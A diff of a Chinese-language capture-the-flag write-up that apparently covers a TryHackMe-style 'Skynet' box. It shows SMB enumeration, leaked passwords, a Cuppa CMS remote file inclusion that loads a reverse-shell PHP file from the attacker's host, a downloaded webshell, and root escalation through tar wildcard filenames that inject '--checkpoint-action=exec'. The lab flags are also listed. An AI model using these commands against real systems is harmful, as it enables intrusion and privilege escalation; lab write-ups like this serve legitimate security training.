@@ -1,7 +1,7 @@
-# 服务扫描
+#  服务扫描
 ```
 ┌──(root💀kali)-[~]
-└─# nmap -sV 10.10.166.193                                                                                                                                                                                   255 ⨯
+└─#  nmap -sV 10.10.166.193                                                                                                                                                                                   255 ⨯
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 05:18 EDT
 Nmap scan report for 10.10.111.23
 Host is up (0.32s latency).
@@ -20,9 +20,9 @@ Nmap done: 1 IP address (1 host up) scanned in 22.67 seconds
 ```
 
 
-# 目录爆破
+#  目录爆破
 ```
-└─# python3 dirsearch.py -u http://10.10.166.193 -e * -t 50 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
+└─#  python3 dirsearch.py -u http://10.10.166.193 -e * -t 50 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -46,12 +46,12 @@ Target: http://10.10.166.193
 
 
 
-### 枚举samba服务
+# # #  枚举samba服务
 
-# 枚举用户，可以用空会话登录
+#  枚举用户，可以用空会话登录
 ```
 ┌──(root💀kali)-[~]
-└─# enum4linux -U 10.10.166.193                                                                                                                                                                                                        255 ⨯
+└─#  enum4linux -U 10.10.166.193                                                                                                                                                                                                        255 ⨯
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Sep  1 02:38:03 2021
 
  ========================== 
@@ -91,10 +91,10 @@ enum4linux complete on Wed Sep  1 02:38:20 2021
 ```
 
 
-# 枚举分享目录
+#  枚举分享目录
 ```
 ┌──(root💀kali)-[~]
-└─# enum4linux -S 10.10.166.193
+└─#  enum4linux -S 10.10.166.193
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Sep  1 02:41:21 2021
 
  ========================== 
@@ -145,7 +145,7 @@ NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 enum4linux complete on Wed Sep  1 02:41:44 2021
 ```
 
-# 连接smb
+#  连接smb
 smbclient  //10.10.166.193/anonymous
 
 在logs/log1.txt里找到密码：cyborg007haloterminator
@@ -156,19 +156,19 @@ question:What is Miles password for his emails?
 answer:cyborg007haloterminator
 ```
 
-# 登录 http://10.10.166.193/squirrelmail/
+#  登录 http://10.10.166.193/squirrelmail/
 
 账号密码：milesdyson：cyborg007haloterminator
 
 
-# 邮件信息1，泄露samba密码
+#  邮件信息1，泄露samba密码
 
 ```
 We have changed your smb password after system malfunction.
 Password: )s{A&2Z=F^n_E.B`
 ```
 
-# 邮件信息2，是一个奇怪的二进制，转成文本
+#  邮件信息2，是一个奇怪的二进制，转成文本
 ```
 01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
 01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
@@ -184,7 +184,7 @@ Password: )s{A&2Z=F^n_E.B`
 balls hav zero tome to meto me tome to meto me tome to meto
 ```
 
-# 邮件信息3，一段奇怪的文字,放到谷歌里搜索了一下，好像是前些年那个出bug的facebook的AI说的一段话，有人说这是AI暴走，我认为这种说法是胡扯
+#  邮件信息3，一段奇怪的文字,放到谷歌里搜索了一下，好像是前些年那个出bug的facebook的AI说的一段话，有人说这是AI暴走，我认为这种说法是胡扯
 
 ```
 i can i i everything else . . . . . . . . . . . . . .
@@ -203,11 +203,11 @@ balls have zero to me to me to me to me to me to me to me to me to
 ```
 
 
-# 登录mailesdyson的samba
+#  登录mailesdyson的samba
 smbclient  //10.10.166.193/milesdyson -U milesdyson 
 密码：)s{A&2Z=F^n_E.B`
 
-#在notes/important.txt里得到信息
+# 在notes/important.txt里得到信息
 
 ```
 1. Add features to beta CMS /45kra24zxs28v3yd
@@ -216,7 +216,7 @@ smbclient  //10.10.166.193/milesdyson -U milesdyson
 
 ```
 
-# 隐藏目录名
+#  隐藏目录名
 /45kra24zxs28v3yd
 
 ```
@@ -232,10 +232,10 @@ answer：/remote file inclusion
 ```
 
 
-# 爆破隐藏目录
+#  爆破隐藏目录
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u "http://10.10.166.193/45kra24zxs28v3yd/" -e* -t 50   
+└─#  python3 dirsearch.py -u "http://10.10.166.193/45kra24zxs28v3yd/" -e* -t 50   
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -259,10 +259,10 @@ Task Completed
 得到登录页面：http://10.10.166.193/45kra24zxs28v3yd/index.php
 
 
-# cms名称
+#  cms名称
 Cuppa CMS
 
-# cms exp
+#  cms exp
 存在Local/Remote File Inclusion
 https://www.exploit-db.com/exploits/25971
 
@@ -276,13 +276,13 @@ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
 ```
 
 
-# 远程读取php文件
+#  远程读取php文件
 准备好反弹shell文件，本地开启一个http服务
 python3 -m http.server
 
 http://10.10.166.193/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.21.169:8000/revse_shell.php
 
-# 拿到初始shell
+#  拿到初始shell
 在/home/milesdyson找到user.txt
 
 ```
@@ -292,29 +292,29 @@ answer：7ce5c2109a40f958099283600a9ae807
 
 
 
-# 转成稳定shell，用命令行下载一句话木马
+#  转成稳定shell，用命令行下载一句话木马
 wget http://10.13.21.169:8000/shell.php1
 
 
-# 一句话木马访问地址，用菜刀连接
+#  一句话木马访问地址，用菜刀连接
 http://10.10.166.193/45kra24zxs28v3yd/administrator/alerts/shell.php
 
-# 可以su milesdyson（需要先转成tty）,密码是：cyborg007haloterminator，但是不可以用ssh直连
+#  可以su milesdyson（需要先转成tty）,密码是：cyborg007haloterminator，但是不可以用ssh直连
 
-# 查看定时任务
+#  查看定时任务
 ```
 $ cat /etc/crontab
 cat /etc/crontab
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
+#  /etc/crontab: system-wide crontab
+#  Unlike any other crontab you don't have to run the `crontab'
+#  command to install the new version when you edit this file
+#  and files in /etc/cron.d. These files also have username fields,
+#  that none of the other crontabs do.
 
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-# m h dom mon dow user  command
+#  m h dom mon dow user  command
 */1 *   * * *   root    /home/milesdyson/backups/backup.sh
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
@@ -323,17 +323,17 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 
 
-# 查看定时任务脚本
+#  查看定时任务脚本
 ```
 $ cat /home/milesdyson/backups/backup.sh
 cat /home/milesdyson/backups/backup.sh
-#!/bin/bash
+# !/bin/bash
 cd /var/www/html
 tar cf /home/milesdyson/backups/backup.tgz *
 ```
 
 
-# 通配符提权，在/var/www/html/分别写入三个文件
+#  通配符提权，在/var/www/html/分别写入三个文件
 因为靶机的nc不能使用-e，我们用另外一种方法做反弹shell
 ```
 mknod /tmp/backpipe p
@@ -345,13 +345,13 @@ echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
 ```
 
-# 通配符提权解释
+#  通配符提权解释
 最后tar cf /home/milesdyson/backups/backup.tgz *这条命令的执行会变成：tar cf /home/milesdyson/backups/backup.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh 
 
-# 另外开启一个监听端口
+#  另外开启一个监听端口
 ```nc -lnvp 4455```
 
-# 在/root/找到root.txt
+#  在/root/找到root.txt
 
 ```
 question：What is the root flag?
